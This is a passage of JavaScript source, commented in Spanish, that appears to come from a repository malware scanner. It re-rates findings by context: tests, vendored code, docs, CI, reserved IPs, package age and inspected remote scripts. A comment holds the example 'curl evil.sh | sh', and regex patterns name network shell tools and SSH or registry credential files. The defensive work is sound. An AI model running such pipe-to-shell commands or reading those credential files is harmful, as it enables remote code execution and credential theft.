'use strict';
// Segunda pasada sobre los hallazgos: comprueba si de verdad son lo que parecen antes de
// decidir su gravedad. Las reglas buscan formas de código peligrosas; aquí se mira dónde
// están y qué hacen. Un aviso nunca desaparece: si baja, la descripción dice por qué.
//
//  1. Datos de prueba: un "curl evil.sh | sh" dentro de una cadena en un test, sin nada que
//     lo ejecute cerca, es un dato, no código que corra.
//  2. Código de terceros copiado en el repo (vendor/, third_party/, *.min.js): los patrones
//     de forma (eval(unescape()), líneas larguísimas…) son habituales en librerías antiguas.
//     Lo que es malicioso por su contenido (minero, robo de credenciales, shell inversa…) no baja.
//  3. Scripts remotos (curl … | sh, irm … | iex, bajar y ejecutar): se descargan como datos y se
//     lee qué hacen (lib/remote.js). Una instrucción del README pesa menos que un script que
//     se ejecuta solo; si el script hace algo malo, sube a crítico.
//  4. Typosquatting: un paquete con nombre parecido a otro popular, pero que existe desde hace
//     años, es un paquete legítimo (deps.dev da la fecha de la primera versión).
//  5. IP directas que son de documentación, privadas o de loopback.
const fs = require('fs');
const path = require('path');
const { threatRules } = require('./rules');
const { findRemoteRuns, inspectRemote, resolveUrl, describe, MAX_SCRIPTS } = require('./remote');
const { commentLines } = require('./comments');

const LINE_RULES = new Map(threatRules.map((r) => [r.id, r]));
const TEST_PATH = /(^|\/)(tests?|__tests__|spec|specs|testdata|test-data|test_data|fixtures?|__fixtures__|__mocks__|e2e)\/|(^|\/)[^/]+[._-](test|spec)s?\.[a-z0-9]+$|(^|\/)tests?\.[a-z0-9]+$|(^|\/)[^/]+_test\.(go|py|rb|rs|exs?)$|(^|\/)test_[^/]+\.py$/i;
const DOC_FILE = /\.(md|markdown|mdx|rst|txt|adoc|asciidoc|textile|org)$/i;
const DOC_PATH = /\.(md|markdown|mdx|rst|txt|adoc|asciidoc|textile|org)$|(^|\/)docs?\//i;
// .yarn/releases y .yarn/plugins: el propio Yarn (minificado) que algunos repos versionan.
const VENDOR_PATH = /(^|\/)(_?vendor|vendored|third_party|third-party|thirdparty|external|bower_components|jspm_packages)\/|(^|\/)\.yarn\/(releases|plugins)\/|[.-]min\.js$/i;
// Superficies que solo se activan en la raíz del proyecto (instalar, compilar, abrir): dentro
// de una carpeta de tests son proyectos de prueba que nadie construye al clonar.
const FIXTURE_RULES = new Set(['pyproject-backend', 'python-build-hook', 'setup-py', 'pth-exec', 'archive-exec', 'archive', 'archive-encrypted', 'npm-lifecycle', 'dep-install-scripts', 'composer-script', 'cargo-wrapper', 'gyp-exec', 'cmake-exec', 'maven-exec', 'msbuild-exec', 'binary', 'pickle-exec', 'r-serialized', 'git-hook', 'vscode-autorun', 'vscode-exec-setting', 'autoexec', 'devcontainer', 'gradle-wrapper-url', 'wrapper-jar']);
// Caracteres Unicode engañosos: en datos de prueba (JSON, textos) son el caso que se prueba.
const UNICODE_RULES = new Set(['trojan-source', 'homoglyph', 'zero-width', 'invisible-code', 'unicode-tags']);
const DATA_FILE = /\.(json|jsonl|txt|ya?ml|csv|tsv|xml|html?|snap|golden|out|expected|md|po)$/i;
// Un mensaje que se imprime con el comando entre comillas es texto para ti. Tiene que ser la
// orden que recibe la cadena (al principio de la línea, o la función $(warning …) de make), no
// una palabra suelta: "help" o "log" pueden ir en la propia URL de un script que sí se ejecuta.
const MESSAGE = /^\s*(echo|printf|print|puts|warn(ing)?|info|error|log|say|msg|die|fail|logger\.\w+|console\.\w+|Write-(Host|Output|Warning))\b|\$\((warning|info|error)\s/i;
// Donde una cadena es una orden que se ejecuta al instalar o abrir el proyecto
const RUN_SURFACE = /(^|\/)(package\.json|setup\.py|pyproject\.toml|setup\.cfg|composer\.json|Cargo\.toml|build\.rs|\.devcontainer\/.*|\.vscode\/.*|[^/]*\.ya?ml)$/i;
// Traducciones: el cirílico de un locale kazajo o el ZWNJ del persa son escritura normal.
const LOCALE_PATH = /(^|\/)(locales?|i18n|l10n|lang|langs|translations?|messages)\//i;
// Reglas de "forma": el mismo patrón aparece en código legítimo antiguo o minificado.
const SHAPE_RULES = new Set(['eval-decode', 'remote-stage', 'long-line', 'obf-hex-ids', 'exec-import', 'download-exec', 'raw-ip', 'anti-vm', 'vm-env', 'ip-recon', 'geofence', 'anti-forensics', 'env-dump', 'hidden-whitespace', 'oversized-source', 'stego-loader', 'stego-lib']);
// Vulnerabilidades que siguen pesando aunque estén en docs o en código de terceros
const KEEP_VULN = /^(secret-|env-file$|dep-vuln$|ext-gitleaks$|ext-trivy$)/;
const REMOTE_RULES = new Set(['curl-pipe', 'ps-pipe-iex', 'download-run', 'readme-pipe']);
// Reglas que buscan una orden de shell: escrita en un fichero de otro lenguaje, no corre sola.
const SHELL_TEXT = new Set([...REMOTE_RULES, 'destructive', 'shell-rc', 'sudo-hijack', 'anti-forensics']);
// Algo que ejecuta texto: si está cerca de la cadena, no se trata como dato.
const SINK = /\b(exec|execSync|execFile|execa|spawn|spawnSync|system|popen|Popen|subprocess|child_process|os\.system|eval|shell_exec|passthru|Runtime\.getRuntime|ProcessBuilder|Invoke-Expression|Start-Process|shelljs)\b|Command::new|exec\.Command|new\s+Function\s*\(|shell\s*=\s*True|\bsh\s+-c\b|\bbash\s+-c\b|`\s*\$\(|%x[({[]|`[^`\n]*\b(rm|curl|wget)\s/;
// Lo mismo, pero solo como llamada: en un texto "system tray" o "exec summary" no ejecutan nada.
const SINK_CALL = /\b(exec|execSync|execFile|execa|spawn|spawnSync|system|popen|Popen|eval|shell_exec|passthru|Invoke-Expression|Start-Process)\s*\(|child_process|subprocess\.|Runtime\.getRuntime|ProcessBuilder|Command::new|exec\.Command|new\s+Function\s*\(/;
// Ficheros cuyas líneas son órdenes: un "rm -rf /" en un test de shell sí se ejecuta.
const SHELL_FILE = /\.(sh|bash|zsh|ksh|fish|ps1|psm1|bat|cmd|bats|mk|mak|ya?ml)$|(^|\/)(Makefile|Dockerfile|Containerfile|Justfile|Rakefile|Taskfile)[^/]*$/i;
// Una comprobación de test (assert_eq!, expect(…)) con el texto entre comillas: es el valor esperado.
const ASSERT = /\b(assert\w*!?|expect|should|refute\w*)\s*[(!]/i;
// Ficheros de configuración que las herramientas leen para trabajar (no claves privadas).
const TOOL_CONFIG = /\.npmrc|\.pypirc|\.kube[\\/]+config|\.docker[\\/]+config\.json/;
// Algo en el fichero que hable con la red: sin esto, leer una credencial no la saca de tu equipo.
const NET = /\b(curl|wget|fetch|axios|requests\.|urllib|http\.client|https?\.(get|request)|XMLHttpRequest|socket|net\.connect|Invoke-(WebRequest|RestMethod)|WebClient|nc\s+-|\/dev\/tcp)\b|https?:\/\//i;
// Texto de ayuda o de ejemplo, y lo que de verdad lee un fichero
const EXAMPLE = /\b(examples?|placeholder|e\.g\.|eg:|usage|hint|default(Value)?)\b|--identity\b|\s-i\s+~/i;
const READS = /\b(readFile\w*|createReadStream|open|read|cat|Get-Content|copyFile\w*|cp|scp|fs\.\w+|upload|send|post)\s*\(|\b(cat|cp|scp|type)\s+["'~$]/i;
// Prosa: etiquetas de HTML dentro del texto o una frase larga
const PROSE = /<\/?(em|code|strong|kbd|b|i|a|p|li|span|br)\b|(\b[A-Za-zÀ-ÿ]{3,}\b[ ,]+){7,}|[\u3040-\u30ff\u4e00-\u9fff]{4,}/;
const SHORTENER =/^https?:\/\/(bit\.ly|tinyurl\.com|cutt\.ly|t\.co|goo\.gl|is\.gd|rb\.gy|ow\.ly|tiny\.cc|shorturl\.at)\//i;
const DOWN = { critical: 'high', high: 'medium', medium: 'low', low: 'info', info: 'info' };
const down = (s, n = 1) => { for (let i = 0; i < n; i++) s = DOWN[s] || s; return s; };

function lineOf(root, file, n, cache) {
  if (!file || !n) return null;
  if (!cache.has(file)) {
    let lines = null;
    try { const st = fs.statSync(path.join(root, file)); if (st.size < 8 * 1024 * 1024) lines = fs.readFileSync(path.join(root, file), 'utf8').split('\n'); } catch { /* no está */ }
    cache.set(file, lines);
  }
  const lines = cache.get(file);
  return lines ? { text: lines[n - 1] || '', near: lines.slice(Math.max(0, n - 3), n + 2).join('\n'), all: lines } : null;
}

// ¿El patrón de la regla está dentro de una cadena (entre comillas) en esa línea?
function insideString(line, rule) {
  const re = rule && rule.re ? new RegExp(rule.re.source, rule.re.flags.replace('g', '')) : null;
  const m = re ? line.match(re) : null;
  if (!m) return false;
  const before = line.slice(0, m.index);
  for (const q of ['"', "'", '`']) {
    const n = (before.match(new RegExp(`(?<!\\\\)${q === '`' ? '`' : q}`, 'g')) || []).length;
    if (n % 2 === 1) return true;
  }
  return false;
}

// ¿Está en un test? Por la ruta o, en Rust, dentro del módulo #[cfg(test)] del propio fichero.
// En Rust solo cuenta lo que está entre las llaves de ese módulo: lo que va después (en un build.rs,
// por ejemplo) se compila y se ejecuta.
function inTest(file, l, n) {
  if (TEST_PATH.test(file)) return true;
  if (!/\.rs$/.test(file) || !l || !l.all) return false;
  for (let i = 0; i < n - 1; i++) {
    if (!/^\s*#\[cfg\(test\)\]/.test(l.all[i])) continue;
    let depth = 0;
    let opened = false;
    for (let j = i + 1; j < l.all.length; j++) {
      for (const c of l.all[j].replace(/"(?:\\.|[^"\\])*"|'(?:\\.|[^'\\])'/g, '')) {
        if (c === '{') { depth++; opened = true; } else if (c === '}') depth--;
      }
      if (j === n - 1) return opened && (depth > 0 || l.all[j].includes('}'));
      if (opened && depth <= 0) break;
    }
  }
  return false;
}

// Los syntax_test_* de los paquetes de Sublime (y de bat) empiezan con una cabecera "SYNTAX TEST".
// Sin ella, un fichero con ese nombre es código normal que otro puede cargar.
function syntaxTest(root, file, cache) {
  if (!/(^|\/)syntax_test_[^/]+$/i.test(file)) return false;
  const l = lineOf(root, file, 1, cache);
  return !!l && l.all.slice(0, 3).some((x) => /SYNTAX TEST\b/.test(x));
}

function note(f, sev, why) {
  if (sev === f.severity && !why) return;
  f.review = { from: f.severity, to: sev, why };
  if (sev !== f.severity) f.severity = sev;
  f.description = `${why} ${f.description || ''}`.trim();
}

// ---------- 6. ¿A quién afecta? ----------
const CI_PATH = /(^|\/)(\.github\/(workflows|actions)\/|\.gitlab-ci|\.circleci\/|\.travis\.yml$|azure-pipelines|Jenkinsfile$|\.buildkite\/|\.drone\.yml$)/i;
const DEPLOY_PATH = /(^|\/)(deploy|deploys|deployment|deployments|k8s|kubernetes|helm|charts|terraform|infra|infrastructure|ansible|manifests|kustomize|argocd|pulumi)\/|\.tf$|\.tfvars$/i;
const CI_RUN = /(^|\/)(\.github\/workflows\/|\.gitlab-ci|\.circleci\/|\.travis\.yml$|azure-pipelines|Jenkinsfile$|\.buildkite\/|\.drone\.yml$)|^ci\//i;
// La web de documentación del proyecto (se publica aparte; no es lo que tú ejecutas)
const DOCSITE_PATH = /(^|\/)(docs?|wiki|website|site|gh-pages|_site)\//i;
const SEMGREP_NOISY =/^(path-join-resolve-traversal|detect-non-literal-regexp|detect-non-literal-fs-filename|detect-object-injection|unsafe-formatstring|plaintext-http-link|using-http-server|express-check-csurf-middleware-usage|missing-integrity|run-as-non-root|github-actions-mutable-action-tag) \[Semgrep\]/;
// open: al clonar o abrir el proyecto · install: al instalar o compilar · run: al ejecutarlo ·
// deploy: al desplegarlo · author: no a ti (claves o CI del autor)
function vulnImpact(v) {
  const file = v.file || '';
  if (/^(secret-|history-secret-|ext-gitleaks$|env-file$)/.test(v.rule) || (v.rule === 'ext-trivy' && /secret/i.test(v.title || ''))) return 'author';
  if (CI_PATH.test(file) || /^gha-/.test(v.rule)) return 'author';
  if (DEPLOY_PATH.test(file) || /^(k8s-|tf-)/.test(v.rule)) return 'deploy';
  if (DOCSITE_PATH.test(file) && v.rule !== 'dep-vuln') return 'docs';
  if (v.rule === 'dep-vuln' && v.dev) return 'install';
  return 'run';
}
function threatImpact(t) {
  const r = t.rule.replace(/^history-/, '');
  if (t.context === 'doc') return 'copy';
  if (/^(git-hook|gitattributes|git-|vscode-|ai-|devcontainer|autoexec|symlink|unicode-tags|invisible-code|trojan-source|homoglyph|zero-width|readme-lure|lfs-)/.test(r)) return 'open';
  if (/^(npm-lifecycle|dep-|setup-py|python-build-hook|pyproject-backend|pth-exec|cargo-|gyp-|cmake-|maven-|gradle-|wrapper-|composer-|msbuild-|lockfile-|typosquat|malicious-package|archive)/.test(r)) return 'install';
  return 'run';
}

// ---------- 5. IP reservadas ----------
function reservedIp(ip) {
  const p = ip.split('.').map(Number);
  if (p.length !== 4 || p.some((x) => !(x >= 0 && x <= 255))) return false;
  const [a, b, c] = p;
  return a === 10 || a === 127 || a === 0 || (a === 169 && b === 254) || (a === 172 && b >= 16 && b <= 31) || (a === 192 && b === 168)
    || (a === 192 && b === 0 && c === 2) || (a === 198 && b === 51 && c === 100) || (a === 203 && b === 0 && c === 113) || (a === 198 && (b === 18 || b === 19))
    || a >= 224 || (a === 100 && b >= 64 && b <= 127) || (a === 255);
}

// ---------- 4. Edad del paquete (deps.dev) ----------
async function packageAge(ecosystem, name) {
  const sys = { npm: 'npm', PyPI: 'pypi', 'crates.io': 'cargo', Go: 'go', Maven: 'maven', RubyGems: 'rubygems', NuGet: 'nuget' }[ecosystem];
  if (!sys) return null;
  const r = await fetch(`https://api.deps.dev/v3/systems/${sys}/packages/${encodeURIComponent(name)}`, { signal: AbortSignal.timeout(10000) });
  if (!r.ok) return null;
  const j = await r.json();
  const dates = (j.versions || []).map((v) => Date.parse(v.publishedAt)).filter(Number.isFinite);
  return dates.length ? { first: Math.min(...dates), versions: dates.length } : null;
}

// out: { vulns, threats }. ctx: { root, online, remote, scan, late, log }
async function review(out, ctx) {
  const { root, online = false, remote = false, scan, late = () => false, log = () => {} } = ctx;
  const cache = new Map();
  const stats = { test: 0, vendor: 0, ip: 0, remote: 0, typosquat: 0, docsDeps: 0 };

  for (const f of out.threats) {
    if (!f.file) continue;
    // Una ruta de credenciales que se enseña como ejemplo (placeholder, "e.g. --identity
    // ~/.ssh/id_ed25519") es un texto para ti: nada la lee si en la línea no hay una lectura.
    // Si el fichero habla con la red, no: la lectura puede ir en otra línea.
    const exampleFile = f.line && !f.history ? lineOf(root, f.file, f.line, cache) : null;
    if (/steal-keys$/.test(f.rule) && ['high', 'medium'].includes(f.severity) && (EXAMPLE.test(String(f.snippet || '')) || /(^|\/)(openapi|swagger)/i.test(f.file)) && !READS.test(String(f.snippet || ''))
      && !(exampleFile && (NET.test(exampleFile.all.join('\n')) || SINK.test(exampleFile.all.join('\n'))))) {
      note(f, 'low', 'Revisado: es una ruta de ejemplo que se muestra (texto de ayuda, placeholder o documentación de la API), no código que lea ese fichero.');
      stats.example = (stats.example || 0) + 1;
      continue;
    }
    // Historial: un curl | sh borrado de la configuración de CI se ejecutó en los servidores de CI
    if (f.history) {
      if (/pipe$/.test(f.rule) && /(^|\/)(\.github|\.circleci|\.gitlab|\.travis\.yml|azure-pipelines|ci\/)/i.test(f.file) && f.severity === 'medium') note(f, 'low', 'Revisado: estaba en la configuración de CI, que se ejecuta en los servidores de integración, no en tu máquina.');
      continue;
    }
    const rule = LINE_RULES.get(f.rule);

    // Lo que corre en el CI del autor (workflows, scripts de ci/): no se ejecuta en tu máquina al
    // clonar, instalar ni usar el proyecto. Las acciones (.github/actions) no entran: las ejecuta
    // quien las use.
    if (CI_RUN.test(f.file) && ['high', 'medium'].includes(f.severity)) {
      f.impact = 'author';
      note(f, 'low', 'Revisado: se ejecuta en el CI del autor (sus servidores de integración), no en tu máquina. Solo te afectaría si haces un fork y activas sus Actions.');
      stats.author = (stats.author || 0) + 1;
      continue;
    }

    // Un texto que explica una función ("se abre al iniciar sesión vía la clave Run del
    // registro"), en la documentación o en las traducciones: lo menciona, no lo hace.
    if (['persist', 'shell-rc'].includes(f.rule) && f.line && ['high', 'medium'].includes(f.severity)) {
      const l = lineOf(root, f.file, f.line, cache);
      if (l && rule && insideString(l.text, rule) && PROSE.test(l.text) && !SINK_CALL.test(l.near)) {
        note(f, 'low', 'Revisado: es un texto que lo menciona (documentación o traducciones dentro del código), no código que lo haga.');
        stats.docs = (stats.docs || 0) + 1;
        continue;
      }
    }
    // Una mención en un comentario de documentación (" * `HKCU\…\Run` registry key") que el
    // analizador no pudo dar por comentario porque lleva comillas invertidas (podría cerrar una
    // plantilla de JS). Si el fichero no ejecuta comandos ni se conecta a nada, no puede hacer nada.
    if (['persist', 'shell-rc', 'steal-keys'].includes(f.rule) && f.line && ['high', 'medium'].includes(f.severity)) {
      const l = lineOf(root, f.file, f.line, cache);
      if (l && /^\s*(\*|\/\/|\/\*)/.test(l.text)) {
        const all = l.all.join('\n');
        if (!SINK.test(all) && !NET.test(all)) {
          note(f, 'low', 'Revisado: está en un comentario de documentación y este fichero no ejecuta comandos ni se conecta a ningún sitio.');
          stats.comment = (stats.comment || 0) + 1;
          continue;
        }
      }
    }
    // Cargar algo y evaluarlo en una línea minificada de miles de caracteres: es lo que hace un
    // cargador de módulos (RequireJS y similares). Sigue a la vista, pero no como alto.
    if (f.rule === 'remote-stage' && f.severity === 'high' && f.line) {
      const l = lineOf(root, f.file, f.line, cache);
      if (l && l.text.length > 300 && !/https?:\/\/(?!localhost)[^\s'"]+/.test(l.near)) {
        note(f, 'medium', 'Revisado: está en código minificado sin ninguna dirección de Internet fija; cargar y evaluar código es lo que hacen los cargadores de módulos. Revisa de dónde viene esta librería.');
        continue;
      }
    }
    // typescript.tsdk: VS Code pregunta antes de usar el TypeScript del workspace.
    if (f.rule === 'vscode-exec-setting' && /typescript\.tsdk/.test(String(f.snippet || '')) && f.severity === 'medium') {
      note(f, 'low', 'Revisado: VS Code no usa este TypeScript sin preguntarte antes ("Use Workspace Version"); solo se ejecutaría si lo aceptas.');
      continue;
    }

    // Proyectos de prueba dentro de tests/: no se instalan ni se construyen al clonar
    if (FIXTURE_RULES.has(f.rule) && TEST_PATH.test(f.file) && f.file.includes('/') && ['critical', 'high', 'medium'].includes(f.severity)) {
      note(f, 'low', 'Revisado: está dentro de los tests (un proyecto de prueba); solo se activaría si alguien construyera ese proyecto de prueba, no al clonar ni al instalar el repo.');
      stats.test++;
      continue;
    }
    // Unicode engañoso en ficheros de datos de los tests: es justo lo que se está probando
    if (UNICODE_RULES.has(f.rule) && TEST_PATH.test(f.file) && DATA_FILE.test(f.file) && f.severity !== 'info') {
      note(f, 'low', 'Revisado: está en un fichero de datos de los tests, donde estos caracteres son el caso que se prueba.');
      stats.test++;
      continue;
    }
    // Carácter invisible dentro de un comentario: no cambia lo que se ejecuta
    if (['zero-width', 'homoglyph'].includes(f.rule) && f.line && ['high', 'medium'].includes(f.severity)) {
      const l = lineOf(root, f.file, f.line, cache);
      if (l && commentLines(f.file, l.all)[f.line - 1]) { note(f, 'low', 'Revisado: está dentro de un comentario, así que no cambia lo que se ejecuta.'); stats.comment = (stats.comment || 0) + 1; continue; }
    }

    // 5. IP de documentación, privadas o loopback: no son servidores de nadie
    if (f.rule === 'raw-ip') {
      const ips = String(f.snippet || '').match(/\b\d{1,3}(\.\d{1,3}){3}\b/g) || [];
      if (ips.length && ips.every(reservedIp)) { note(f, 'info', 'Revisado: la IP es de documentación, privada o local, no un servidor externo.'); stats.ip++; continue; }
    }

    // Ejemplos de resaltado de sintaxis (syntax_test_* de los paquetes de Sublime/bat): texto con
    // todas las construcciones del lenguaje, que ningún programa ejecuta.
    if (['critical', 'high', 'medium'].includes(f.severity) && syntaxTest(root, f.file, cache)) {
      note(f, f.severity === 'critical' ? 'medium' : 'low', 'Revisado: es un fichero de ejemplo para probar el resaltado de sintaxis (syntax_test_…), que se lee como texto y no se ejecuta.');
      stats.test++;
      continue;
    }
    // Paquetes con nombre parecido a uno popular en los requirements de un test (o en un
    // fichero de ejemplo de sintaxis): no se instalan con el proyecto.
    if (f.rule === 'typosquat' && TEST_PATH.test(f.file) && ['critical', 'high'].includes(f.severity)) {
      note(f, /(^|\/)(syntax_test_|fixtures?\/|testdata\/|source\/)/i.test(f.file) ? 'low' : 'medium', 'Revisado: está en un fichero de dependencias de los tests, que no se instala con el proyecto (solo si preparas el entorno de pruebas).');
      stats.test++;
      continue;
    }
    if (f.rule === 'symlink-escape' && TEST_PATH.test(f.file) && ['critical', 'high'].includes(f.severity)) {
      note(f, 'medium', 'Revisado: el enlace está dentro de los tests, probablemente para probar justo este caso; aun así apunta fuera del repo.');
      stats.test++;
      continue;
    }

    // 1. Datos de prueba
    if (rule && f.line && !REMOTE_RULES.has(f.rule) && f.severity !== 'info') {
      // Ficheros del paquete publicado (npm:…, pypi:…) no están en disco: vale el fragmento guardado
      const l = lineOf(root, f.file, f.line, cache) || (f.snippet ? { text: f.snippet, near: f.snippet } : null);
      if (l && !SINK.test(l.near)) {
        const str = insideString(l.text, rule);
        // Una orden de shell escrita en un test de otro lenguaje (Rust, Python…) solo correría si
        // algo la ejecutara; un raw string de Rust (r#"…"#) no siempre se ve como cadena.
        if (inTest(f.file, l, f.line) && (str || (SHELL_TEXT.has(f.rule) && !SHELL_FILE.test(f.file)))) {
          note(f, 'low', 'Revisado: aparece como dato dentro de una cadena en un test y no hay nada cerca que lo ejecute.');
          stats.test++;
          continue;
        }
        if (str && ASSERT.test(l.text)) {
          note(f, 'low', 'Revisado: es el valor esperado de una comprobación (assert/expect), un texto que no se ejecuta.');
          stats.test++;
          continue;
        }
      }
    }

    // Credenciales: .npmrc, .pypirc o la config de kubectl las leen las propias herramientas para
    // trabajar; y si el fichero no habla con la red, lo que lee no sale de tu equipo desde ahí.
    if (f.rule === 'steal-keys' && f.severity === 'high') {
      const l = lineOf(root, f.file, f.line, cache);
      const m = l && rule && l.text.match(new RegExp(rule.re.source, rule.re.flags.replace('g', '')));
      if (m && TOOL_CONFIG.test(m[0]) && !/id_(rsa|ed25519|ecdsa)|credentials|Keychains/.test(m[0])) {
        note(f, 'medium', 'Revisado: es un fichero de configuración que las herramientas (npm, pip, kubectl, Docker) leen para trabajar, no una clave privada; mira qué se hace con él.');
        stats.config = (stats.config || 0) + 1;
        continue;
      }
      if (l && !NET.test(l.all.join('\n'))) {
        note(f, 'medium', 'Revisado: este fichero no se conecta a ningún sitio, así que lo que lee no sale de tu equipo desde aquí.');
        stats.config = (stats.config || 0) + 1;
        continue;
      }
    }
    // Arranque de la terminal o servicios: en la documentación es una instrucción para ti, y en
    // un instalador dejar un servicio en marcha es lo esperado.
    if (['shell-rc', 'persist'].includes(f.rule) && DOC_PATH.test(f.file) && ['high', 'medium'].includes(f.severity)) {
      note(f, 'low', 'Revisado: es una instrucción de la documentación; no se ejecuta sola, solo si la copias en tu terminal.');
      stats.docs = (stats.docs || 0) + 1;
      continue;
    }
    if (f.rule === 'persist' && /(^|\/)(install|setup|get)[\w.-]*\.(sh|bash|ps1)$/i.test(f.file) && f.severity === 'high') {
      note(f, 'medium', 'Revisado: está en el instalador, donde dejar un servicio arrancado es lo normal; revisa qué es lo que queda en marcha.');
      continue;
    }

    // 2. Código de terceros
    if (SHAPE_RULES.has(f.rule) && VENDOR_PATH.test(f.file)) {
      note(f, down(f.severity, 2), 'Revisado: está en código de terceros copiado en el repo; este patrón es habitual en librerías antiguas o minificadas.');
      stats.vendor++;
      continue;
    }
    // Binarios y lecturas de credenciales dentro de una librería copiada (p. ej. los lanzadores
    // .exe de distlib en pip, o leer ~/.pypirc en una herramienta de publicar paquetes)
    if (['binary', 'steal-keys'].includes(f.rule) && VENDOR_PATH.test(f.file) && f.severity !== 'info') {
      note(f, f.rule === 'binary' ? 'low' : down(f.severity), 'Revisado: está en una librería de terceros copiada en el repo; es parte de lo que hace esa librería, no del proyecto.');
      stats.vendor++;
      continue;
    }

    // Escritura de otros idiomas en ficheros de traducción
    if (['homoglyph', 'zero-width'].includes(f.rule) && LOCALE_PATH.test(f.file) && f.severity !== 'info') {
      note(f, 'info', 'Revisado: está en un fichero de traducción, donde mezclar alfabetos o usar caracteres de unión es escritura normal.');
      stats.locale = (stats.locale || 0) + 1;
    }
  }

  for (const v of out.vulns) {
    if (!v.file || v.history || KEEP_VULN.test(v.rule) || v.severity === 'info') continue;
    // Código de ejemplo dentro de la documentación: no es código del proyecto
    if (DOC_FILE.test(v.file)) { note(v, 'info', 'Revisado: es un ejemplo dentro de la documentación, no código que se ejecute.'); stats.docs = (stats.docs || 0) + 1; continue; }
    // Vulnerabilidad en código de terceros copiado en el repo: existe, pero es de esa librería
    if (VENDOR_PATH.test(v.file)) { note(v, down(v.severity), 'Revisado: está en código de terceros copiado en el repo.'); stats.vendor++; }
  }
  // Claves de búsqueda de Algolia DocSearch: son públicas a propósito (van en la web)
  for (const v of out.vulns) {
    if (!/^(secret-|ext-gitleaks|ext-semgrep|ext-trivy)/.test(v.rule) || !v.file || !v.line || v.severity === 'info') continue;
    const l = lineOf(root, v.file, v.line, cache);
    if (l && /algolia|docsearch/i.test(l.all.slice(Math.max(0, v.line - 8), v.line + 3).join('\n')) && /apiKey|searchKey|search_api_key/i.test(l.text)) {
      note(v, 'info', 'Revisado: es la clave de búsqueda pública de Algolia DocSearch, que va en la web a propósito y solo permite buscar.');
      stats.publicKey = (stats.publicKey || 0) + 1;
    }
  }

  // 3. Scripts remotos
  // Lo del CI del autor ya se ha resuelto arriba: descargar su script no cambia a quién afecta.
  const remoteFindings = out.threats.filter((f) => REMOTE_RULES.has(f.rule) && f.file && !f.history && f.impact !== 'author');
  // Mismo fichero con readme-pipe y curl-pipe: queda el más concreto
  for (const f of remoteFindings.filter((x) => x.rule === 'readme-pipe')) {
    if (remoteFindings.some((x) => x !== f && x.file === f.file && x.rule !== 'readme-pipe')) f.duplicate = true;
  }
  out.threats = out.threats.filter((f) => !f.duplicate);
  const jobs = new Map(); // url → [findings]
  for (const f of remoteFindings.filter((x) => !x.duplicate)) {
    const l = lineOf(root, f.file, f.line, cache);
    let runs = l ? findRemoteRuns(l.text) : [];
    if (!runs.length && l && f.rule === 'download-run') runs = findRemoteRuns(l.all.slice(f.line - 1, f.line + 6).join('\n'));
    // En un test, dentro de una cadena y sin nada que lo ejecute: dato de prueba
    if (l && inTest(f.file, l, f.line) && (insideString(l.text, LINE_RULES.get(f.rule) || { re: /(curl|wget|irm|iwr)\b/ }) || !SHELL_FILE.test(f.file)) && !SINK.test(l.near)) {
      note(f, 'low', 'Revisado: aparece como dato dentro de una cadena en un test y no hay nada cerca que lo ejecute.');
      stats.test++;
      continue;
    }
    // Un mensaje que se imprime ("ejecuta: curl … | sh") tampoco se ejecuta: es texto para ti.
    const message = !!(l && MESSAGE.test(l.text) && insideString(l.text, LINE_RULES.get(f.rule) || { re: /(curl|wget|irm|iwr)\b/ }) && !RUN_SURFACE.test(f.file) && !SINK.test(l.near));
    // También en una página web, dentro de <pre> o <code>: es la orden que se enseña para copiarla.
    const doc = DOC_PATH.test(f.file) || message || !!(l && /\.html?$/i.test(f.file) && /<\/?(pre|code|kbd)\b/i.test(l.near));
    // Una instrucción para ti (README, docs) no se ejecuta sola: pesa menos que un script.
    if (doc && f.severity === 'high') note(f, 'medium', message ? 'Es un mensaje que se te muestra: el comando va entre comillas y no se ejecuta, solo si lo copias en tu terminal.' : 'Es una instrucción de la documentación: no se ejecuta sola, solo si la copias en tu terminal.');
    f.context = doc ? 'doc' : 'code';
    for (const r of runs) {
      if (!jobs.has(r.url)) jobs.set(r.url, []);
      jobs.get(r.url).push(f);
    }
  }
  const coverage = [];
  if (jobs.size) {
    if (!remote) {
      coverage.push({ label: 'Scripts remotos que el repo manda ejecutar', status: 'skip', detail: `${jobs.size} sin descargar: solo se descargan en el servidor local (aquí el navegador no puede pedirlos a cualquier dominio)` });
    } else if (late()) {
      coverage.push({ label: 'Scripts remotos que el repo manda ejecutar', status: 'skip', detail: 'saltado: se acabó el tiempo del análisis' });
    } else {
      const urls = [...jobs.keys()].slice(0, MAX_SCRIPTS);
      log(`Descargando para revisar ${urls.length} script${urls.length === 1 ? '' : 's'} remoto${urls.length === 1 ? '' : 's'} (sin ejecutarlos)…`);
      const results = await Promise.all(urls.map((u) => inspectRemote(u, scan).catch((e) => ({ url: u, ok: false, error: e.message }))));
      let ok = 0;
      for (const r of results) {
        if (r.ok) ok++;
        for (const f of jobs.get(r.url)) {
          f.remote = { url: r.url, ok: r.ok, finalUrl: r.finalUrl, sha256: r.sha256, lines: r.lines, kind: r.kind, hosts: r.hosts, behaviours: r.behaviours, threats: r.threats, error: r.error };
          f.description = `${f.description} ${describe(r)}`;
          if (r.ok && r.bad) {
            f.severity = 'critical';
            f.title = `${f.title}: el script hace algo malicioso`;
          } else if (r.ok && r.behaviours.some((b) => b.id === 'nested')) {
            // Solo baja y ejecuta otra cosa: lo que de verdad corre en tu máquina es esa segunda
            // parte, que no se ha revisado. No baja la gravedad.
            f.title = `${f.title} (revisado: a su vez descarga y ejecuta otro script)`;
          } else if (r.ok && !r.html) {
            // Revisado y sin nada malicioso: sigue siendo código ajeno sin verificar.
            f.severity = f.context === 'doc' ? 'low' : 'medium';
            f.title = `${f.title} (revisado: sin nada malicioso)`;
          }
        }
        stats.remote++;
      }
      coverage.push({ label: 'Scripts remotos que el repo manda ejecutar', status: ok === urls.length && urls.length === jobs.size ? 'ok' : 'partial', detail: `${ok} de ${jobs.size} descargados y revisados sin ejecutarlos${urls.length < jobs.size ? ` (máximo ${MAX_SCRIPTS})` : ''}` });
    }
  }

  // Enlace acortado en el README: se sigue la redirección (sin ejecutar nada) para decir adónde
  // lleva. Si acaba en código de GitHub o GitLab y no es un ejecutable, se puede revisar ahí.
  for (const f of out.threats.filter((x) => x.rule === 'readme-lure' && SHORTENER.test(String(x.snippet || '')))) {
    if (!remote || late()) break;
    const url = String(f.snippet).match(/^\S+/)[0];
    const r = await resolveUrl(url).catch((e) => ({ error: e.message }));
    if (r.error) { f.description += ` No se pudo seguir el enlace acortado (${r.error}).`; continue; }
    const dest = new URL(r.finalUrl);
